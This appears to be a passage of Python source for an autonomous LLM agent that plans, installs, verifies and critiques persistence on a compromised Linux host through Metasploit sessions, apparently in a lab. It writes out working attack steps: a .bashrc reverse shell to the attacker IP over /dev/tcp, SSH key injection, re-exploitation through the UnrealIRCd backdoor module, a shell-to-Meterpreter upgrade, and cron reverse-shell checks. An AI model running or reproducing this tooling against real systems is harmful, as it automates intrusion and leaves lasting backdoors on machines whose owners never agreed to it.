                f'tool_session_command({session_id}, "chmod 600 ~/.ssh/authorized_keys")  # on TARGET',
            ],
            "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> whoami",
            "notes": ("Requires SSH service on target. "
                      "IMPORTANT: <PUBKEY> is a PLACEHOLDER — you MUST replace it with the "
                      "actual public key text printed by `cat /tmp/persist_key.pub` (step 2). "
                      "Do NOT inject the literal string <PUBKEY> or a made-up key — a "
                      "non-RSA value will make the SSH login verification fail."),
        })
        techniques.append({
            "name": "Bash profile backdoor",
            "reliability": "MEDIUM",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "echo \'/bin/bash -c \\"bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\\" &\' >> ~/.bashrc")',
                f'tool_session_command({session_id}, "cat ~/.bashrc | tail -3")  # verify on TARGET',
            ],
            "verification": "tool_session_command: cat ~/.bashrc shows the reverse shell line appended",
            "notes": "Fires on next user login. Less reliable than cron.",
        })

    # When the node assigned a technique, scope the menu to procedures under it ONLY.
    if only_slug:
        scoped = [t for t in techniques if classify_technique(t["name"]) == only_slug]
        cat = mitre.get_technique("persistence", only_slug)
        cat_name = cat.name if cat else only_slug
        cat_id = cat.id if cat else ""
        header = (
            f"\n**ASSIGNED MITRE TECHNIQUE: {cat_id} {cat_name} ({only_slug})** — "
            "You are LOCKED to this technique. Execute PROCEDURES under it only; do NOT "
            "switch to a different persistence technique. On retry, vary the PROCEDURE "
            "(different command/path/verification) under this SAME technique. If every "
            "procedure under this technique is exhausted, say so plainly in your plan "
            "(TECHNIQUE_EXHAUSTED) — the node will fail and the replanner will grow the "
            "next technique. This overrides any generic 'switch technique on retry' guidance.\n"
        )
        if scoped:
            output = header + "\n**PROCEDURES for the assigned technique:**\n"
            for i, t in enumerate(scoped, 1):
                compatible = "YES" if session_type in t["session_types"] else "NO (wrong session type)"
                output += f"\n{i}. **{t['name']}** — Reliability: {t['reliability']}, Compatible: {compatible}\n"
                output += f"   Steps:\n"
                for step in t["steps"]:
                    output += f"     - {step}\n"
                output += f"   Verification: {t['verification']}\n"
                output += f"   Notes: {t['notes']}\n"
            output += ("\nUse a procedure above FIRST. Query the knowledge base only for a "
                       "DIFFERENT PROCEDURE under this SAME technique if the above fails.\n")
        else:
            # No pre-built procedure for this slug — hand over the catalog hint + RAG.
            hint = cat.procedure_hint if cat else ""
            output = header + (
                f"\nNo pre-built procedure is bundled for this technique. Procedure guidance: "
                f"{hint}\nUse query_knowledge_base to find concrete procedures for "
                f"{cat_id} {cat_name}, then produce your plan. Stay within this technique.\n"
            )
        return output

    # Format for injection into context (legacy self-select: full menu)
    output = "\n**RECOMMENDED TECHNIQUES (pre-verified, prioritize these):**\n"
    for i, t in enumerate(techniques, 1):
        compatible = "YES" if session_type in t["session_types"] else "NO (wrong session type)"
        output += f"\n{i}. **{t['name']}** — Reliability: {t['reliability']}, Compatible: {compatible}\n"
        output += f"   Steps:\n"
        for step in t["steps"]:
            output += f"     - {step}\n"
        output += f"   Verification: {t['verification']}\n"
        output += f"   Notes: {t['notes']}\n"

    output += "\nUse these FIRST. Only query the knowledge base if all recommended techniques have failed.\n"
    output += (
        "\n**DEAD-SESSION RECOVERY VECTOR:** The sessions handed to this stage often come from the "
        "UnrealIRCd 3.2.8.1 backdoor (port 6667), which is unstable and can die mid-installation. "
        "If the session dies and no live substitute exists, the executor may re-establish one with "
        "exploit/unix/irc/unreal_ircd_3281_backdoor (set RHOSTS=<target>, LHOST=" + KALI_IP + ", run) "
        "and then resume installation on the new session ID.\n"
    )
    return output


# =============================================================================
# NODE IMPLEMENTATIONS
# =============================================================================

def planner_node(state: PersistenceState) -> dict:
    """Choose persistence technique. ReAct loop with RAG."""
    print_colored("\n[Persistence Planner] Selecting technique...", Colors.HEADER)

    messages = state["messages"]
    target_ip = state.get("target_ip", "")
    session_id = state.get("session_id", "")
    session_type = state.get("session_type", "")
    access_level = state.get("access_level", "user")

    # Count planner tool calls in current cycle
    planner_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage):
            break
        if isinstance(msg, ToolMessage):
            planner_tool_count += 1

    if planner_tool_count == 0:
        # First call: build context with deterministic technique recommendations
        context = (
            f"TARGET: {target_ip}\n"
            f"SESSION: {session_type} (ID: {session_id})\n"
            f"ACCESS LEVEL: {access_level}\n"
            f"OBJECTIVE: {state.get('objective', '')}\n"
        )

        # If access level is unknown, the planner must discover it before committing
        # to a technique that depends on root vs user write paths.
        if access_level == "unknown":
            context += (
                "\nACCESS LEVEL: unknown — first step: run tool_session_command to "
                "check whoami/sudo -l before choosing technique.\n"
            )

        # Surface any open-port hints from the objective / initial recon text so
        # the planner can filter SSH-dependent techniques when port 22 is not
        # confirmed open. Scan the objective plus the initial HumanMessage.
        port_source = state.get("objective", "") or ""
        for msg in messages:
            if isinstance(msg, HumanMessage) and msg.content:
                port_source += "\n" + msg.content
        known_ports = _extract_open_ports(port_source)
        if known_ports:
            context += f"\nKNOWN OPEN PORTS: {known_ports}\n"
        else:
            context += (
                "\nKNOWN OPEN PORTS: unknown — port 22/SSH NOT confirmed open. "
                "Prefer cron over SSH key injection unless you confirm SSH is open.\n"
            )

        # Inject deterministic technique recommendations. When the node assigned a
        # MITRE technique, scope the menu to procedures under THAT technique only —
        # the subagent chooses the procedure, the node/replanner chose the technique.
        context += _get_recommended_techniques(
            access_level, session_type, session_id,
            only_slug=state.get("assigned_technique", ""),
        )

        # Include ALL prior critic feedback so the planner never repeats a failed
        # technique. Each retry appends a new CRITIC FEEDBACK HumanMessage; scanning
        # only the most recent one would let the planner cycle the same technique.
        failed_attempts = [
            msg.content for msg in messages
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in (msg.content or "")
        ]
        if failed_attempts:
            context += "\nPREVIOUS ATTEMPTS (DO NOT REPEAT):\n"
            for n, fb in enumerate(failed_attempts, 1):
                context += f"{n}. {fb}\n"
        planner_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct loop — include from last HumanMessage, sanitized
        cycle_start = 0
        for i in range(len(messages) - 1, -1, -1):
            if isinstance(messages[i], HumanMessage):
                cycle_start = i
                break
        planner_msgs = _sanitize_message_window(list(messages[cycle_start:]))

    # Safety valve
    if planner_tool_count >= MAX_PLANNER_TOOL_CALLS:
        print_colored(f"[Persistence Planner] RAG cap reached ({planner_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=planner_msgs + [HumanMessage(content=(
                "Max queries reached. Produce your final persistence plan now."
            ))],
            system_prompt=PLANNER_PROMPT
        )
    else:
        response = call_llm(
            messages=planner_msgs,
            system_prompt=PLANNER_PROMPT,
            tools=PLANNER_TOOLS
        )

    if response.content and not response.tool_calls:
        print_colored(f"[Persistence Planner] Plan:\n{response.content[:300]}", Colors.OKGREEN)
        return {
            "messages": [AIMessage(content=f"[Persistence Planner] {response.content}")],
            "persistence_plan": response.content,
        }

    return {"messages": [response]}


def executor_node(state: PersistenceState) -> dict:
    """Install persistence mechanism. ReAct loop with SSH/MSF tools."""
    messages = state["messages"]
    print_colored("\n[Persistence Executor] Installing mechanism...", Colors.HEADER)

    # Count tool calls since planner output
    executor_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[Persistence Planner]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    # Build message window from planner output. Bound the capture to the CURRENT
    # retry cycle ONLY: anchor at the MOST RECENT planner tag, not the first one.
    # Capturing from the first planner tag would let the window span two planner
    # cycles, interleaving executor AI+tool pairs from different cycles (and any
    # trimmed/dangling tool_calls) in confusing ways that _sanitize_message_window
    # can only patch with dummy ToolMessages.
    cycle_start_idx = None
    for i in range(len(messages) - 1, -1, -1):
        m = messages[i]
        if isinstance(m, AIMessage) and "[Persistence Planner]" in (m.content or ""):
            cycle_start_idx = i
            break
    if cycle_start_idx is not None:
        executor_msgs = list(messages[cycle_start_idx:])
    else:
        executor_msgs = [messages[-1]]
    executor_msgs = _sanitize_message_window(executor_msgs)

    # Anti-repeat guard: on the first call of this executor cycle, surface what
    # was already attempted in prior loops so the model does not blindly re-run
    # the same module/commands after a critic FAIL.
    if executor_tool_count == 0:
        prior_attempts = [
            msg.content for msg in messages
            if isinstance(msg, AIMessage) and "[Persistence Executor]" in (msg.content or "")
        ]
        if prior_attempts:
            recap = "PREVIOUSLY ATTEMPTED (DO NOT REPEAT — try a different approach):\n"
            for n, att in enumerate(prior_attempts, 1):
                recap += f"{n}. {att[:400]}\n"
            executor_msgs = [HumanMessage(content=recap)] + executor_msgs

    # Safety valve
    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
        print_colored(f"[Persistence Executor] Tool cap ({executor_tool_count}). Forcing summary.", Colors.WARNING)
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content=(
                "Max tool calls reached. List ONLY what you VERIFIED actually succeeded "
                "(i.e., the command returned the expected output you can see in the tool "
                "results above). If any step failed, returned an error, or you never saw "
                "its output, say so explicitly. Do NOT claim success for steps whose output "
                "you did not see. Begin your summary with this exact format:\n"
                "PARTIAL INSTALL — <what succeeded> | FAILED — <what did not>"
            ))],
            system_prompt=EXECUTOR_PROMPT
        )
        # At the cap we MUST hand the verifier a summary even if the model
        # disobeyed and emitted tool_calls. Strip any tool_calls and capture text.
        install_text = response.content or "(executor hit tool cap — no summary produced)"
        return {
            "messages": [AIMessage(content=f"[Persistence Executor] {install_text}")],
            "install_result": install_text,
        }

    response = call_llm(
        messages=executor_msgs,
        system_prompt=EXECUTOR_PROMPT,
        tools=EXECUTOR_TOOLS
    )

    # Capture text summary into install_result. Tag the message with a stable
    # prefix so the verifier's cycle-boundary scan can find it reliably.
    if response.content and not response.tool_calls:
        return {
            "messages": [AIMessage(content=f"[Persistence Executor] {response.content}")],
            "install_result": response.content,
        }

    return {"messages": [response]}


def verifier_node(state: PersistenceState) -> dict:
    """Verify persistence mechanism works. ReAct loop with SSH."""
    messages = state["messages"]
    install_result = state.get("install_result", "")
    persistence_plan = state.get("persistence_plan", "")

    print_colored("\n[Persistence Verifier] Testing mechanism...", Colors.HEADER)

    # Count verifier tool calls in THIS cycle only.
    # Two cycle boundaries, whichever is hit first walking backwards:
    #   1. The executor's tagged summary (normal entry into the verifier).
    #   2. A "CRITIC FEEDBACK" HumanMessage — this marks the start of a fresh
    #      retry cycle. On a FAIL->retry, stale ToolMessages from the PREVIOUS
    #      verifier cycle still live in the (operator.add) message list; without
    #      this guard they get counted against the new verifier's budget and
    #      short-change it (e.g. starting at 3/5 on entry).
    verifier_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in (msg.content or ""):
            break
        if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content:
            # Hit executor's tagged summary = start of verifier cycle.
            # Rely solely on the explicit tag (executor now always tags its
            # summary); full-string equality on install_result was brittle.
            if "[Persistence Executor]" in msg.content:
                break
        if isinstance(msg, ToolMessage):
            verifier_tool_count += 1
    print_colored(
        f"[Persistence Verifier] Tool count this cycle: {verifier_tool_count}",
        Colors.WARNING,
    )

    # Build context for verifier
    if verifier_tool_count == 0:
        context = (
            f"PERSISTENCE PLAN:\n{persistence_plan}\n\n"
            f"INSTALLATION RESULT:\n{install_result}\n\n"
            f"TARGET: {state.get('target_ip', '')}\n"
            f"SESSION: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
            f"\nVerify the mechanism works by testing it now."
        )
        # For a cron reverse-shell, a listed entry + live daemon + /dev/tcp is NOT
        # proof the callback actually arrives. Require a CONFIRMED callback (or a
        # heartbeat artifact) before allowing STATUS: WORKING — otherwise the
        # critic false-PASSes a shell that fails silently every minute.
        plan_install_blob = f"{persistence_plan}\n{install_result}".lower()
        if "cron" in plan_install_blob:
            context += (
                "\n\n**CRON — EXECUTION MUST BE PROVEN (not just listed):** A `crontab -l` "
                "listing is an install, not proof the job runs. Run the plan's VERIFICATION_PLAN "
                "proof-of-execution check; for cron that is normally ONE of:\n"
                "  (a) HEARTBEAT ARTIFACT (preferred, self-contained) — if a file-write heartbeat "
                "cron was installed (writing to /tmp/.hb), wait on KALI with "
                "tool_linux_terminal(\"sleep 70\") (NEVER a session-side sleep), then ON TARGET: "
                "tool_session_command(<id>, \"cat /tmp/.hb\"). If the file exists and has grown, "
                "the cron daemon is PROVEN to fire jobs — STATUS: WORKING.\n"
                f"  (b) LISTENER CALLBACK — start a background listener on Kali and wait for a "
                f"connection: tool_linux_terminal(\"timeout 75 nc -lvnp 4444\"). A single inbound "
                f"connection from the target within 75s is valid proof — STATUS: WORKING.\n"
                "If the plan named a different execution check, honor THAT instead. Report "
                "STATUS: PARTIAL only if the execution check runs and does NOT confirm firing "
                "(e.g. /tmp/.hb never grew, no callback) — then note the heartbeat fallback so the "
                "next attempt can add it. Do NOT downgrade a plan whose execution check passed."
            )
        verifier_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct loop. Anchor the window at the most recent HumanMessage
        # that carries the cycle's "PERSISTENCE PLAN" entry context rather than a
        # fixed tail: after a full planner+executor cycle the message list easily
        # exceeds 10, so a bare tail can drop the install-mechanism context and
        # leave the LLM verifying against nothing. Walk back to the anchor, then
        # take from it to the end (capped to a 10-msg tail if no anchor is found).
        anchor = next(
            (i for i in range(len(messages) - 1, -1, -1)
             if isinstance(messages[i], HumanMessage)
             and "PERSISTENCE PLAN" in (messages[i].content or "")),
            max(0, len(messages) - 10),
        )
        verifier_msgs = _sanitize_message_window(list(messages[anchor:]))

    # Safety valve
    if verifier_tool_count >= MAX_VERIFIER_TOOL_CALLS:
        print_colored(f"[Persistence Verifier] Tool cap ({verifier_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=verifier_msgs + [HumanMessage(content=(
                "Max verification commands reached. Provide your verification assessment now."
            ))],
            system_prompt=VERIFIER_PROMPT
        )
    else:
        response = call_llm(
            messages=verifier_msgs,
            system_prompt=VERIFIER_PROMPT,
            tools=VERIFIER_TOOLS
        )

    # Capture text summary
    if response.content and not response.tool_calls:
        return {
            "messages": [response],
            "verification_result": response.content,
        }

    return {"messages": [response]}


def critic_node(state: PersistenceState) -> dict:
    """Evaluate installation + verification."""
    messages = state["messages"]
    current_step = state.get("loop_step", 0)

    print_colored("\n[Persistence Critic] Evaluating...", Colors.HEADER)

    persistence_plan = state.get("persistence_plan", "")
    install_result = state.get("install_result", "")
    verification_result = state.get("verification_result", "")

    # Extract the technique name that was attempted so FAIL feedback can name it
    # explicitly. The planner's failed_attempts scan reads CRITIC FEEDBACK
    # HumanMessages, so embedding a structured FAILED_TECHNIQUE line lets the
    # planner reliably avoid re-selecting the same approach on retry.
    failed_technique = "unknown"
    m = re.search(r"TECHNIQUE:\s*([^\n]+)", persistence_plan or "", re.IGNORECASE)
    if m:
        failed_technique = m.group(1).strip()

    # HARD GUARD: never let the critic LLM emit PASS on absent verification.
    # If the verifier produced no text-only assessment (hit its tool cap with
    # empty content, or the loop exited before it ran), verification_result is
    # the initial empty string. The CRITIC_PROMPT says "Both required for PASS"
    # but the LLM can still false-PASS on a blank section, so we short-circuit
    # a mandatory FAIL in code without consulting the model.
    if not (verification_result or "").strip():
        print_colored(
            "[Persistence Critic] No verification output captured — forcing FAIL.",
            Colors.FAIL,
        )
        return {
            "messages": [HumanMessage(content=(
                "CRITIC FEEDBACK: VERDICT: FAIL\n"
                f"FAILED_TECHNIQUE: {failed_technique}\n"
                "METHOD: unknown\n"
                "ASSESSMENT: Verification was not performed — no output captured.\n"
                "FEEDBACK: Re-run the verifier and confirm the mechanism actually "
                "works before judging. Do not report success without verification."
            ))],
            "loop_step": current_step + 1,
            "critic_verdict": "FAIL",
        }

    evidence = (
        f"PERSISTENCE PLAN:\n{persistence_plan}\n\n"
        f"INSTALLATION RESULT:\n{install_result}\n\n"
        f"VERIFICATION RESULT:\n{verification_result}\n\n"
        f"LOOP STEP: {current_step} of {MAX_PERSISTENCE_RETRIES}\n"
    )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )

    verdict_text = (response.content or "").strip()
    print_colored(f"[Persistence Critic] {verdict_text[:300]}", Colors.OKCYAN)

    new_step = current_step + 1
    upper = verdict_text.upper()
    # Strict: only the mandated "VERDICT: PASS" line counts. The old loose
    # fallback false-PASSed when FEEDBACK merely mentioned PASS (e.g.
    # "PASS is reachable once you fix the cron entry"). Empty verdict -> FAIL.
    if not verdict_text:
        verdict = "FAIL"
    elif "VERDICT: PASS" in upper:
        verdict = "PASS"
    else:
        verdict = "FAIL"

    print_colored(f"[Persistence Critic] Verdict: {verdict}",
                  Colors.OKGREEN if verdict == "PASS" else Colors.FAIL)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[Persistence Critic] PASS — {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "PASS",
        }
    else:
        return {
            "messages": [HumanMessage(content=(
                f"CRITIC FEEDBACK: FAILED_TECHNIQUE: {failed_technique}\n{verdict_text}"
            ))],
            "loop_step": new_step,
            "critic_verdict": "FAIL",
        }


# =============================================================================
# TOOL NODES
# =============================================================================

def planner_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(PLANNER_TOOLS)
    return tool_node.invoke(state)

def executor_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(EXECUTOR_TOOLS)
    return tool_node.invoke(state)

def verifier_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(VERIFIER_TOOLS)
    return tool_node.invoke(state)

# =============================================================================
# ROUTING LOGIC
# =============================================================================

def route_after_planner(state: PersistenceState) -> Literal["planner_tools", "executor"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, HumanMessage):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_PLANNER_TOOL_CALLS:
            return "executor"
        return "planner_tools"
    return "executor"


def route_after_executor(state: PersistenceState) -> Literal["executor_tools", "verifier"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and "[Persistence Planner]" in (m.content or ""):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "verifier"
        return "executor_tools"
    return "verifier"


def route_after_verifier(state: PersistenceState) -> Literal["verifier_tools", "critic"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            # Mirror verifier_node's cycle-boundary detection: stop at a fresh
            # retry boundary so stale prior-cycle ToolMessages do not inflate
            # the count and trip the cap early.
            if isinstance(m, HumanMessage) and "CRITIC FEEDBACK" in (m.content or ""):
                break
            if isinstance(m, AIMessage) and not m.tool_calls and m.content:
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_VERIFIER_TOOL_CALLS:
            return "critic"
        return "verifier_tools"
    return "critic"


def route_after_critic(state: PersistenceState) -> Literal["planner", "__end__"]:
    time.sleep(2)  # Rate limiting
    current_step = state.get("loop_step", 0)
    if current_step >= MAX_PERSISTENCE_RETRIES:
        print_colored("--- MAX PERSISTENCE RETRIES REACHED ---", Colors.FAIL)
        return END
    verdict = state.get("critic_verdict", "FAIL")
    if verdict == "PASS":
        return END
    return "planner"

# =============================================================================
# GRAPH CONSTRUCTION
# =============================================================================

def build_graph() -> StateGraph:
    workflow = StateGraph(PersistenceState)

    workflow.add_node("planner", planner_node)
    workflow.add_node("planner_tools", planner_tools_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node)
    workflow.add_node("verifier", verifier_node)
    workflow.add_node("verifier_tools", verifier_tools_node)
    workflow.add_node("critic", critic_node)

    workflow.set_entry_point("planner")

    # Planner ReAct loop
    workflow.add_conditional_edges(
        "planner", route_after_planner,
        {"planner_tools": "planner_tools", "executor": "executor"}
    )
    workflow.add_edge("planner_tools", "planner")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor", route_after_executor,
        {"executor_tools": "executor_tools", "verifier": "verifier"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Verifier ReAct loop
    workflow.add_conditional_edges(
        "verifier", route_after_verifier,
        {"verifier_tools": "verifier_tools", "critic": "critic"}
    )
    workflow.add_edge("verifier_tools", "verifier")

    # Critic routing
    workflow.add_conditional_edges(
        "critic", route_after_critic,
        {"planner": "planner", END: END}
    )

    return workflow

# =============================================================================
# SESSION LIVENESS
# =============================================================================

def _shell_responds(session_id, nonce="__PERSIST_ALIVE_PROBE__") -> bool:
    """True iff the command_shell actually RETURNS output for a trivial echo.

    A flaky reverse_perl command_shell can degrade into a READ-ZOMBIE: still present
    in session.list (so `get_session_type` says "alive"), but its shell I/O is dead —
    every read comes back "(no output)". Such a session is useless for persistence,
    and grinding it burns the whole retry budget for nothing. This probe is the
    ground truth "can I read from this shell at all?" check.
    """
    try:
        out = msf_session.run_session_command(session_id, f"echo {nonce}", timeout=20) or ""
    except Exception:
        return False
    return nonce in out


def _meterpreter_sids() -> set:
    """Snapshot of ALL meterpreter session ids currently open (best-effort, never raises).

    Used as the "before" baseline for the shell_to_meterpreter upgrade: any meterpreter
    session that appears AFTER this snapshot (and matches the target) is the upgrade's
    fruit. Snapshotting all of them — not just the target's — avoids host-matching
    inconsistencies when a session's host field is blank in session.list.
    """
    sids = set()
    try:
        sessions = msf_session.client.call("session.list") or {}
    except Exception:
        return sids
    for sid, details in sessions.items():
        raw_type = details.get(b"type", details.get("type", b""))
        if isinstance(raw_type, bytes):
            raw_type = raw_type.decode("utf-8", errors="ignore")
        if "meterpreter" in raw_type:
            sids.add(str(sid))
    return sids


def _upgrade_shell_to_meterpreter(target_ip: str, session_id: str,
                                  lhost: str = None, lport: int = 4455,
                                  timeout: int = 60):
    """Upgrade a live command_shell to a meterpreter via post/multi/manage/shell_to_meterpreter.

    Returns the new meterpreter session id (str) on success, or None on failure/timeout
    (caller then keeps the command_shell). NEVER raises and NEVER hangs (bounded poll).

    Why: the UnrealIRCd cmd/unix/reverse_perl command_shell on MS3 degrades into a
    read-zombie — listed alive but every shell read returns "(no output)" — which
    breaks cron-heartbeat verification (B3). A meterpreter session has reliable framed
    I/O, so upgrading fixes the read reliability the verifier needs.

    Uses the RPC MODULE API (client.modules.use → execute), never the interactive
    console (tool_metasploit_rpc / send_command wedges into 'sessions -i' mode). The
    module stands up its own reverse handler (HANDLER defaults True); LHOST is the
    reverse-reachable attacker IP (KALI_IP) and ReverseListenerBindAddress is already
    setg 0.0.0.0 globally at console init, so the handler binds inside the container.
    """
    lhost = lhost or KALI_IP
    before = _meterpreter_sids()
    try:
        client = msf_session.client
        mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
        try:
            mod["SESSION"] = int(session_id)
        except (ValueError, TypeError):
            mod["SESSION"] = session_id
        mod["LHOST"] = lhost
        if lport is not None:
            try:
                mod["LPORT"] = int(lport)
            except Exception:
                pass
        print_colored(
            f"[Persistence Probe] Upgrading command_shell {session_id} -> meterpreter "
            f"(shell_to_meterpreter LHOST={lhost} LPORT={lport}) — command_shells on "
            f"this target read-zombie; meterpreter I/O is reliable.",
            Colors.OKCYAN,
        )
        mod.execute()
    except Exception as e:
        print_colored(
            f"[Persistence Probe] shell_to_meterpreter launch failed ({e}) — "
            f"keeping the command_shell.",
            Colors.WARNING,
        )
        return None

    # Poll session.list for a NEW meterpreter session on the same target (bounded).
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            sessions = msf_session.client.call("session.list") or {}
        except Exception:
            time.sleep(3)
            continue
        for sid, details in sessions.items():
            sid_str = str(sid)
            if sid_str in before:
                continue
            raw_type = details.get(b"type", details.get("type", b""))
            if isinstance(raw_type, bytes):
                raw_type = raw_type.decode("utf-8", errors="ignore")
            if "meterpreter" not in raw_type:
                continue
            host = details.get(b"session_host",
                    details.get("session_host",
                    details.get(b"target_host", details.get("target_host", b""))))
            if isinstance(host, bytes):
                host = host.decode("utf-8", errors="ignore")
            # Accept a new meterpreter whose host matches the target, or whose host
            # field is blank (session.list sometimes omits it right after open).
            if target_ip and host and host != target_ip:
                continue
            print_colored(
                f"[Persistence Probe] UPGRADE SUCCESS — new meterpreter session {sid_str} "
                f"on {host or target_ip} (from command_shell {session_id}).",
                Colors.OKGREEN,
            )
            return sid_str
        time.sleep(3)

    print_colored(
        f"[Persistence Probe] Upgrade to meterpreter timed out after {timeout}s — "
        f"falling back to the command_shell.",
        Colors.WARNING,
    )
    return None


def _probe_session(target_ip: str, session_id: str, session_type: str):
    """Check that session_id is alive before entering the graph.

    Returns a tuple (live_session_id, live_session_type, status_message).

    - If the requested session is alive, returns it unchanged.
    - If it is dead, attempts to find a live substitute session on the SAME
      target via session.list and returns the substitute.
    - If no live session exists at all, returns (None, None, message) so the
      caller can abort cleanly with a best-effort findings dict instead of
      burning every executor tool slot on 'Session X not found' errors.
    """
    try:
        stype = msf_session.get_session_type(session_id)
    except Exception as e:
        print_colored(
            f"[Persistence Probe] session.list raised {e} — proceeding with given session.",
            Colors.WARNING,
        )
        return session_id, session_type, "probe_error_proceeding"

    if stype is not None:
        if isinstance(stype, bytes):
            stype = stype.decode("utf-8", errors="ignore")
        resolved_type = "meterpreter" if "meterpreter" in stype else "command_shell"
        if resolved_type == "meterpreter":
            print_colored(
                f"[Persistence Probe] Session {session_id} is LIVE (meterpreter).",
                Colors.OKGREEN,
            )
            return session_id, (session_type or "meterpreter"), "alive"

        # command_shell path. A reverse_perl command_shell on this target is fragile —
        # it read-zombies mid-run (listed alive, but every shell READ returns no output),
        # which breaks cron-heartbeat verification (B3). Try to UPGRADE it to meterpreter
        # (reliable framed I/O) FIRST, before deciding whether it's usable:
        #   shell_to_meterpreter is WRITE-driven — it writes a stager to the shell and the
        #   new meterpreter dials back on its own channel. A read-zombie's WRITE side often
        #   still reaches the target, so the upgrade can RESCUE a shell whose reads are dead.
        # Attempting it here (not only on a responsive shell) is what lets B3 recover when
        # the shell has already zombied by probe time.
        new_sid = _upgrade_shell_to_meterpreter(target_ip, session_id)
        if new_sid:
            return new_sid, "meterpreter", f"upgraded_{session_id}"

        # Upgrade unavailable/failed — fall back: use the command_shell IFF it actually
        # returns output; otherwise it's a read-zombie we couldn't rescue -> fall through
        # to the substitute search (clean abort if none).
        if _shell_responds(session_id):
            print_colored(
                f"[Persistence Probe] Session {session_id} is LIVE (command_shell; "
                f"upgrade unavailable, shell is responsive).",
                Colors.OKGREEN,
            )
            return session_id, (session_type or "command_shell"), "alive"

        print_colored(
            f"[Persistence Probe] Session {session_id} is a READ-ZOMBIE "
            f"(listed alive but the shell returns no output, and could not be upgraded) "
            f"— searching for a responsive substitute...",
            Colors.WARNING,
        )
        # fall through to the substitute search below (clean abort if none)

    # Session is dead — try to find a live substitute on the same target.
    print_colored(
        f"[Persistence Probe] Session {session_id} is DEAD — searching for a live substitute...",
        Colors.WARNING,
    )
    try:
        sessions = msf_session.client.call("session.list") or {}
    except Exception as e:
        print_colored(f"[Persistence Probe] session.list failed: {e}", Colors.FAIL)
        return None, None, f"Session {session_id} dead and session.list failed ({e})."

    def _g(d, key, default=None):
        return d.get(key.encode(), d.get(key, default))

    for sid, details in sessions.items():
        sid_str = str(sid)
        if sid_str == str(session_id):
            continue
        # Match on the same target host where possible.
        host = _g(details, "session_host", _g(details, "target_host", b""))
        if isinstance(host, bytes):
            host = host.decode("utf-8", errors="ignore")
        raw_type = _g(details, "type", b"shell")
        if isinstance(raw_type, bytes):
            raw_type = raw_type.decode("utf-8", errors="ignore")
        resolved_type = "meterpreter" if "meterpreter" in raw_type else "command_shell"
        if target_ip and host and host != target_ip:
            continue
        # Don't swap one zombie for another: a command_shell candidate must respond.
        if resolved_type == "command_shell" and not _shell_responds(sid_str):
            print_colored(
                f"[Persistence Probe] Candidate session {sid_str} is also a "
                f"read-zombie — skipping.",
                Colors.WARNING,
            )
            continue
        print_colored(
            f"[Persistence Probe] Substituting live session {sid_str} "
            f"({resolved_type}, host={host or 'unknown'}).",
            Colors.OKGREEN,
        )
        # Same rationale as the primary path: upgrade a responsive command_shell
        # substitute to meterpreter for reliable I/O; keep the shell if it fails.
        if resolved_type == "command_shell":
            new_sid = _upgrade_shell_to_meterpreter(target_ip, sid_str)
            if new_sid:
                return new_sid, "meterpreter", f"upgraded_{sid_str}"
        return sid_str, resolved_type, f"substituted_{sid_str}"

    return None, None, f"Session {session_id} dead/unresponsive and no live, responsive session to {target_ip} found."


# =============================================================================
# TECHNIQUE FEASIBILITY PRECHECK
# =============================================================================
# When a node assigns a MITRE technique, the subagent is LOCKED to it and must not
# self-switch. But a locked technique that cannot possibly work here (systemd absent
# on this target, or a root-only technique on a non-root session) would otherwise
# make the subagent grind its full 5×retry × 10-tool budget (~an hour) before
# failing. A cheap deterministic precheck fails FAST to failure_category=
# technique_infeasible so the walker/replanner immediately grows a COMPATIBLE
# technique instead. Probes are best-effort: any error → assume feasible (don't
# block on a flaky probe).

def _probe_priv(session_id: str, session_type: str) -> str:
    """Best-effort 'root'|'user'|'unknown' for the live session (meterpreter uses
    getuid, command_shell uses id — meterpreter rejects id)."""
    try:
        cmd = "getuid" if "meterpreter" in (session_type or "").lower() else "id"
        out = (msf_session.run_session_command(session_id, cmd, timeout=15) or "").lower()
    except Exception:
        return "unknown"
    if "uid=0(" in out or "server username: root" in out or "system" in out:
        return "root"
    if "uid=" in out or "server username:" in out:
        return "user"
    return "unknown"


